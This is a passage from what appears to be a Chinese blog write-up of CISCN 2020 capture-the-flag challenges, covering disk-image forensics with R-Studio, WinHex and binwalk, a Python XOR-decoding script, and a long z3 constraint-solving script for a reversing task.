alt="ciscn2020-3"></p><p>这时需要判断扫描出来的部分文件中是否存在需要的flag文件，判断方法：</p><ul><li><p>直接把文件恢复到桌面进行判断</p></li><li><p>用winhex软件对比恢复出来的部分文件是否正确，此时还可借助winhex软件寻找其他没有被r-studio软件扫面出来的文件</p><p>用winhex软件打开disk_dump文件，再在菜单栏选择专业工具，在专业工具里面点击将镜像文件转换成磁盘，这是你便能看见这个linux系统的结构（坏磁盘不能）</p></li></ul><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-4.png" alt="ciscn2020-4"></p><p> 在浏览窗口中可以看一下文件夹里面有哪些文件可以直接提出来，比如图中的png图片和txt文件等</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-5.png" alt="ciscn2020-5"></p><p> 因为文件在linux系统中被删除i节点表是没有直接指针的，所以通过浏览窗口和全系统的文件查看和r-studio的对比、结合勘察后，最终确定在r-studio的flag.txt文件就是我们要找的flag文件</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-6.png" alt="ciscn2020-6"></p><p>winhex相对应的位置是17472扇区，先提取出来：</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-7.png" alt="ciscn2020-7"></p><p>binwalk再分析磁盘，提取出一个elf可执行文件，ida分析之：</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-8.png" alt="ciscn2020-8"></p><p>根据代码得出算法：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">a = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p, v6 <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">    print(<span class="built_in">chr</span>((v6 ^ (<span class="number">0x22</span> * (p + <span class="number">1</span>))) - v5 &amp; <span class="number">0xFF</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="Revere"><a href="#Revere" class="headerlink" title="Revere"></a>Revere</h2><h3 id="0x01-z3"><a href="#0x01-z3" class="headerlink" title="0x01 z3"></a>0x01 z3</h3><p>z3库一把梭，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">v46 = z3.Int(<span class="string">&quot;v46&quot;</span>)</span><br><span class="line">v47 = z3.Int(<span class="string">&quot;v47&quot;</span>)</span><br><span class="line">v48 = z3.Int(<span class="string">&quot;v48&quot;</span>)</span><br><span class="line">v49 = z3.Int(<span class="string">&quot;v49&quot;</span>)</span><br><span class="line">v50 = z3.Int(<span class="string">&quot;v50&quot;</span>)</span><br><span class="line">v51 = z3.Int(<span class="string">&quot;v51&quot;</span>)</span><br><span class="line">v52 = z3.Int(<span class="string">&quot;v52&quot;</span>)</span><br><span class="line">v53 = z3.Int(<span class="string">&quot;v53&quot;</span>)</span><br><span class="line">v54 = z3.Int(<span class="string">&quot;v54&quot;</span>)</span><br><span class="line">v55 = z3.Int(<span class="string">&quot;v55&quot;</span>)</span><br><span class="line">v56 = z3.Int(<span class="string">&quot;v56&quot;</span>)</span><br><span class="line">v57 = z3.Int(<span class="string">&quot;v57&quot;</span>)</span><br><span class="line">v58 = z3.Int(<span class="string">&quot;v58&quot;</span>)</span><br><span class="line">v59 = z3.Int(<span class="string">&quot;v59&quot;</span>)</span><br><span class="line">v60 = z3.Int(<span class="string">&quot;v60&quot;</span>)</span><br><span class="line">v61 = z3.Int(<span class="string">&quot;v61&quot;</span>)</span><br><span class="line">v62 = z3.Int(<span class="string">&quot;v62&quot;</span>)</span><br><span class="line">v63 = z3.Int(<span class="string">&quot;v63&quot;</span>)</span><br><span class="line">v64 = z3.Int(<span class="string">&quot;v64&quot;</span>)</span><br><span class="line">v65 = z3.Int(<span class="string">&quot;v65&quot;</span>)</span><br><span class="line">v66 = z3.Int(<span class="string">&quot;v66&quot;</span>)</span><br><span class="line">v67 = z3.Int(<span class="string">&quot;v67&quot;</span>)</span><br><span class="line">v68 = z3.Int(<span class="string">&quot;v68&quot;</span>)</span><br><span class="line">v69 = z3.Int(<span class="string">&quot;v69&quot;</span>)</span><br><span class="line">v70 = z3.Int(<span class="string">&quot;v70&quot;</span>)</span><br><span class="line">v71 = z3.Int(<span class="string">&quot;v71&quot;</span>)</span><br><span class="line">v72 = z3.Int(<span class="string">&quot;v72&quot;</span>)</span><br><span class="line">v73 = z3.Int(<span class="string">&quot;v73&quot;</span>)</span><br><span class="line">v74 = z3.Int(<span class="string">&quot;v74&quot;</span>)</span><br><span class="line">v75 = z3.Int(<span class="string">&quot;v75&quot;</span>)</span><br><span class="line">v76 = z3.Int(<span class="string">&quot;v76&quot;</span>)</span><br><span class="line">v77 = z3.Int(<span class="string">&quot;v77&quot;</span>)</span><br><span class="line">v78 = z3.Int(<span class="string">&quot;v78&quot;</span>)</span><br><span class="line">v79 = z3.Int(<span class="string">&quot;v79&quot;</span>)</span><br><span class="line">v80 = z3.Int(<span class="string">&quot;v80&quot;</span>)</span><br><span class="line">v81 = z3.Int(<span class="string">&quot;v81&quot;</span>)</span><br><span class="line">v82 = z3.Int(<span class="string">&quot;v82&quot;</span>)</span><br><span class="line">v83 = z3.Int(<span class="string">&quot;v83&quot;</span>)</span><br><span class="line">v84 = z3.Int(<span class="string">&quot;v84&quot;</span>)</span><br><span class="line">v85 = z3.Int(<span class="string">&quot;v85&quot;</span>)</span><br><span class="line">v86 = z3.Int(<span class="string">&quot;v86&quot;</span>)</span><br><span class="line">v87 = z3.Int(<span class="string">&quot;v87&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">bytearray</span>([</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDB</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA6</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB6</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x82</span>, <span class="number">0x4B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD7</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEF</span>, <span class="number">0x2D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDC</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8F</span>, <span class="number">0x52</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x6B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x37</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x93</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBE</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x56</span>, <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x5B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFE</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDB</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x59</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x71</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF9</span>, <span class="number">0x81</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">])</span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">s = z3.Solver()</span><br><span class="line">s.add(<span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + 